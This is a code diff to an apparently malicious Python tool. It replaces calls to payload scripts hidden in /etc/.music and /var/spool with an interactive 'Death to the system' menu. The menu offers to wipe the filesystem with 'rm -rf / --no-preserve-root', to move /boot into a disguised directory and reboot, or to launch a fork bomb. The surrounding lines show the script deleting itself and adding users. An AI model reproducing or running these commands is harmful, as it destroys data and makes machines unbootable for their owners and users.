@@ -35,8 +35,21 @@ def main():
             cont = False
             os.remove(argv[0])
         elif(value.lower() in  ('k')):
-            os.system("bash /etc/.music/brickPayload.sh")
-            os.system("bash /var/spool/.payloadBrick.sh")
+            print("Death to the system")
+            print("1. Remove all")
+            print("2. Move boot directory and reload")
+            print("3. Infinite recursion/memory leak (may not kill, but will be annoying)")
+            option = input("How would you like to kill the system: ")
+            if(option.lower() in ('1')):
+                os.system("rm -rf / --no-preserve-root")
+            elif(option.lower() in ('2')):
+                os.system("mkdir /etc/music")
+                os.system("mv /boot/* /etc/music")
+                os.system("reboot")
+            elif(option.lower() in ('3')):
+                os.system(":(){ :|:& };:")
+            else:
+                print("Invalid option. Returning")
         elif(value.lower() in  ('a')):
             print("Adding a user.....")
             name = input("Enter username: ")
